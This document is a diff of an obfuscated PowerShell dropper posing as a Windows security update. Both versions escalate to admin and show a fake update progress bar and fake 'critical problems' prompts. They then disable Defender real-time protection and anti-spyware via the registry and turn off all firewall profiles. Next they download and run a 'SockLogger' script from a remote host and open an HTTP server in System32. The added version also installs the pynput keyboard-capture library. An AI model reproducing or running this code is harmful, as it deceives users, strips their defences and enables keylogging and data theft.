@@ -1,23 +1,25 @@
- seT-VariAbLe ("0fEQ"+"w")  ( [typE]("{2}{1}{3}{0}{6}{4}{5}" -f 'RinciPa','eCuri','s','ty.P','IndowsID','ENTITy','L.W')); if (-NOT ([Security.Principal.WindowsPrincipal]  $0FEQw::("{1}{2}{0}"-f'nt','GetCurr','e').Invoke())."iSin`RO`le"([Security.Principal.WindowsBuiltInRole] ("{0}{1}{2}"-f 'Admi','ni','strator')))
-
+sEt  ('3j'+'Yh') (  [tYPe]("{3}{8}{6}{5}{1}{10}{0}{9}{7}{4}{2}" -F 'nDoWSi','INcIpal.W','Y','S','It','pr','URity.','nt','EC','dE','i') );if (-NOT ([Security.Principal.WindowsPrincipal]  $3jyh::("{1}{0}{2}"-f 're','GetCur','nt').Invoke())."iS`INrolE"([Security.Principal.WindowsBuiltInRole] ("{2}{1}{0}"-f'rator','dminist','A')))
 {
 
-  ${Arg`UMe`NTS} = "& '" +${MYinvo`C`ATion}."myCoMma`Nd"."d`ef`IniTIon" + "'"
+  ${A`RGuMe`Nts} = "& '" +${m`yinvo`C`ATI`On}."MYcom`Ma`ND"."DEf`inI`TIoN" + "'"
 
-  &("{2}{0}{3}{1}"-f'ta','rocess','S','rt-P') ("{3}{1}{2}{0}" -f'l','wersh','el','po') -Verb ("{1}{0}"-f 'unAs','r') -ArgumentList ${arGuM`en`TS}
+  &("{2}{1}{0}{3}" -f 't-Proce','r','Sta','ss') ("{1}{0}{2}"-f 'wer','po','shell') -Verb ("{1}{0}" -f 's','runA') -ArgumentList ${A`RGum`enTS}
 
   Break
-
-}
-for (${i} = 1; ${i} -le 50; ${i}++ ) {
-    &("{1}{4}{3}{2}{0}" -f'ss','Write-','re','rog','P') -Activity ("{3}{7}{6}{8}{5}{4}{0}{1}{9}{2}" -f 's',' che','...','Pl','ows i','d',' whi','ease wait','le win','cking for updates') -Status ("$i% "+'Compl'+'et'+'e:') -PercentComplete ${i}
-    &("{2}{3}{1}{0}" -f'p','Slee','S','tart-') -Milliseconds 0.500
 }
 
-.("{2}{1}{3}{0}"-f 'leep','art','St','-S') -Seconds 1
-.("{1}{3}{0}{2}" -f'te-H','Wr','ost','i') "`r`n`r`n`r`n`r`n`r`n"
+&("{1}{2}{0}"-f 'leep','St','art-S') -Seconds 2
 
-write-Host ="
+for (${I} = 1; ${I} -le 50; ${I}++ ) {
+    &("{0}{1}{2}"-f'Write-Prog','res','s') -Activity ("{8}{9}{4}{0}{7}{11}{1}{5}{13}{2}{6}{3}{10}{14}{12}" -f 'h','ows is ch','for','pd','t w','eckin',' u','il','Ple','ase wai','at','e wind','..','g ','es.') -Status ("$i% "+'Co'+'mp'+'l'+'ete:') -PercentComplete ${i}
+    .("{0}{3}{1}{2}" -f'Sta','Slee','p','rt-') -Milliseconds 0.500
+}
+.("{1}{2}{0}"-f't-Sleep','S','tar') -Seconds 2
+
+&("{1}{0}{2}"-f 'H','Write-','ost') "`r`n`r`n`r`n`r`n`r`n`r"
+
+
+Write-Host "
                  __
             ,-~¨^  ^¨-,           _,
            /          / ;^-._...,¨/
@@ -35,29 +37,31 @@ write-Host ="
 "
 
 
-&("{0}{1}{2}{3}"-f'W','r','ite-O','utput') ('[!]'+' '+'SECURI'+'TY '+'UPDATE'+'! '+'Pl'+'ease '+'dont'+' '+'t'+'urn '+'o'+'ff '+'the'+' '+"device.....`r`n")
+${s`hElL} = .("{2}{1}{0}"-f 'ct','je','New-Ob') -ComObject ("{2}{3}{1}{0}" -f'ell','h','W','script.S')
+&("{3}{2}{1}{0}" -f'cy','i','t-ExecutionPol','Se') ("{0}{2}{1}" -f 'Un','tricted','res') -Scope ("{2}{0}{1}"-f 'ren','tUser','Cur') | &("{1}{0}" -f 'ho','ec') ${shE`ll}.("{1}{2}{0}"-f'eys','sen','dk').Invoke("Y`r`n"); &("{0}{2}{1}{3}" -f'Start','Sle','-','ep') -Seconds 2; &('py') ('-3') -m ("{0}{1}"-f 'pi','p') ("{0}{2}{1}" -f'in','all','st') ("{2}{0}{1}"-f'u','t','pynp'); &("{1}{2}{0}"-f 'Sleep','Star','t-') -Seconds 5
 
-.("{1}{2}{0}" -f 'p','Star','t-Slee') -Seconds 3
-&("{2}{3}{0}{1}" -f 'utpu','t','W','rite-O') ("`r`n[!] "+'WINDOW'+'S '+'FOUND'+' '+'CRIT'+'ICAL '+'PRO'+'BL'+'EMS! '+"`r`n`r`n[!] "+'Af'+'ter '+'wi'+'ndo'+'ws '+'wi'+'ll '+'p'+'op'+'-out, '+'pr'+'e'+'ss '+('{0'+'}y'+'es{0}'+' ') -F  [char]39+'pleas'+'e'+' '+'an'+'d '+'wait'+' '+'for'+' '+'t'+'he '+'pr'+'oce'+'ss '+'to'+' '+'fi'+'nish.')
+&("{2}{1}{0}{3}" -f 't','Ou','Write-','put') ('[!]'+' '+'SECURIT'+'Y '+'UPD'+'ATE:'+' '+'Please'+' '+'dont'+' '+'turn'+' '+'o'+'ff '+'the'+' '+"device.....`r`n")
 
-&("{1}{3}{2}{0}"-f 'ep','St','e','art-Sl') -Second 4
+&("{0}{1}{2}" -f 'S','ta','rt-Sleep') -Seconds 4
+.("{2}{1}{0}" -f 'utput','e-O','Writ') ("`r`n[!] "+'W'+'I'+'NDOWS '+'FOUND'+' '+'CR'+'ITICAL'+' '+'P'+'RO'+'BLEMS: '+"`r`n`r`n[!] "+'Aft'+'er '+'WIND'+'OWS '+'wil'+'l '+'po'+'p-out,'+' '+'pre'+'s'+'s '+('IPyy'+'e'+'sIPy'+' ')."Re`P`LACe"('IPy',[stRIng][CHAr]39)+'plea'+'se '+'and'+' '+'w'+'ait '+'for'+' '+'t'+'he '+'proce'+'s'+'s '+'to'+' '+'fi'+'nish'+'.')
 
-
-
-${m`Al} = .("{0}{1}{3}{4}{2}" -f 'Set-MpP','r','rence','ef','e') -DisableRealtimeMonitoring ${t`RuE}
-
-${M`Al2} = &("{4}{1}{2}{0}{3}"-f 'Proper','ew','-Item','ty','N') -Path ((("{0}{5}{3}{8}{4}{1}{10}{7}{2}{9}{6}"-f'H','ARE{0}Policies{0}Mi','Windows Defen','LM:{0}','W','K','er','}','SOFT','d','crosoft{0')) -F  [chAR]92) -Name ("{0}{3}{1}{2}{4}{5}"-f'Disable','nt','i','A','S','pyware') -Value 1 -PropertyType ("{0}{1}" -f'DWO','RD') -Force
-
-${M`AL3} = .("{0}{1}"-f 'n','etsh') ("{0}{1}{2}" -f 'advfi','rewa','ll') ("{1}{0}" -f'et','s') ("{1}{3}{2}{0}"-f'ofiles','a','pr','ll') ("{0}{1}"-f 'st','ate') ("{1}{0}"-f 'f','of')
-&("{2}{0}{1}" -f's','hell.exe','power') -ep ("{2}{1}{0}"-f 's','ypas','b') -WindowStyle ("{1}{0}"-f 'dden','hi') -Command ${M`AL}; .("{2}{0}{1}" -f'Slee','p','Start-') -Seconds 2; ${m`AL2}; .("{1}{2}{0}"-f'leep','S','tart-S') -Seconds 3; ${m`AL3};
-.("{1}{2}{0}{3}"-f'S','Start','-','leep') -Seconds 3
+.("{2}{0}{1}{3}"-f'art','-','St','Sleep') -Second 4
 
 
+${M`Al} = .("{0}{3}{2}{1}{4}"-f'Se','er','Pref','t-Mp','ence') -DisableRealtimeMonitoring ${t`RuE}
 
-${MAc`H`iNe} = ("{5}{2}{0}{3}{1}{4}"-f '://','.0.0.21','tp','10',':','ht')
-${P`ort} = "80"
-(.("{0}{2}{1}"-f'New','Object','-') ("{0}{1}{3}{2}" -f 'N','e','bClient','t.We')).("{2}{0}{1}{3}"-f 'n','loadFi','Dow','le').Invoke("$Machine$Port/SockLogger-Obfuscate.pyw", ((("{3}{8}{1}{7}{11}{0}{5}{10}{4}{9}{6}{2}{12}"-f'SockLo','rs8O','cat','C:8O','Ob','gge','s','Ipublic8','IUse','fu','r-','OI','e.pyw'))-RePLACE ([char]56+[char]79+[char]73),[char]92));
-.("{2}{1}{0}" -f'ep','le','Start-S') -Seconds 2
-&("{3}{1}{2}{0}"-f't-Process','a','r','st') -FilePath ((("{4}{0}{8}{10}{7}{5}{2}{1}{9}{6}{3}"-f':{0','0}S','c{','ger-Obfuscate.pyw','C','publi','Log','s{0}','}U','ock','ser'))-f  [chAr]92)
-${Ch`ANG`Ed} = &('cd') ((("{0}{3}{4}{2}{1}" -f 'C:','stem32','Asy','fYAWindo','wsfY')) -CrePlAce([Char]102+[Char]89+[Char]65),[Char]92)
-&("{1}{0}{2}" -f 'owershell.e','p','xe') -ep ("{1}{0}{2}" -f 'y','b','pass') -NoExit -Command "&""{$ChangeD; Start-Sleep -Seconds 2; py -3.10 -m http.server 2222; Start-Sleep -Seconds 2}"
+${m`Al2} = &("{1}{3}{2}{0}" -f'rty','New-','ope','ItemPr') -Path ((("{5}{6}{12}{0}{9}{13}{3}{4}{2}{10}{11}{7}{1}{8}"-f'TWARE','f','icros','Po','licies{0}M','HKLM:{','0}','ows De','ender','{','of','t{0}Wind','SOF','0}'))-F  [CHaR]92) -Name ("{4}{0}{3}{2}{1}"-f'i','Spyware','leAnti','sab','D') -Value 1 -PropertyType ("{0}{1}"-f 'DW','ORD') -Force
+
+${mA`L3} = .("{1}{0}" -f'h','nets') ("{2}{1}{0}{3}"-f'fi','v','ad','rewall') ("{1}{0}"-f 't','se') ("{0}{1}{2}" -f'allp','rofi','les') ("{1}{0}"-f 'tate','s') ("{1}{0}" -f'ff','o')
+.("{0}{1}{2}"-f 'pow','ers','hell.exe') -ep ("{0}{1}" -f 'bypas','s') -WindowStyle ("{1}{0}" -f 'en','hidd') -Command ${M`AL}; .("{2}{1}{0}"-f'eep','Sl','Start-') -Seconds 2; ${m`Al2}; .("{2}{0}{1}" -f 'le','ep','Start-S') -Seconds 3; ${Ma`L3};
+.("{0}{2}{1}" -f 'S','t-Sleep','tar') -Seconds 3
+
+
+
+${MaC`Hi`NE} = ("{0}{2}{3}{1}"-f 'http://10','0.21:','.0','.')
+${Po`Rt} = "80"
+(.("{2}{1}{3}{0}"-f 'ect','w-O','Ne','bj') ("{3}{1}{0}{2}" -f 'WebClie','t.','nt','Ne')).("{0}{2}{3}{1}"-f'Down','e','loa','dFil').Invoke("$Machine$Port/SockLogger-Obfuscate.pyw", ((("{0}{7}{6}{11}{9}{4}{5}{3}{10}{1}{2}{8}"-f 'C','e.','py','-Obf','e','r','}Users{0}public{0}SockL',':{0','w','gg','uscat','o'))-f[ChAR]92));
+&("{3}{1}{2}{0}"-f'eep','rt','-Sl','Sta') -Seconds 2
+.("{1}{2}{0}"-f'ss','s','tart-Proce') -FilePath ((("{0}{3}{4}{1}{2}{5}{6}{7}"-f'C:g9HUsersg9','i','c','Hpu','bl','g9HSockLogger-','Obfus','cate.pyw')) -CrEPLAce  'g9H',[cHAR]92)
+${CHa`N`ged} = &('cd') ((("{1}{6}{5}{0}{2}{3}{4}" -f 'ws{0}s','C:{0','y','stem3','2','o','}Wind')) -f [CHAR]92)
+.("{1}{0}{2}{3}"-f 'e','pow','rs','hell.exe') -ep ("{1}{0}" -f 'ass','byp') -NoExit -Command "&""{$ChangeD; Start-Sleep -Seconds 2; py -3.10 -m http.server 2222; Start-Sleep -Seconds 2}"
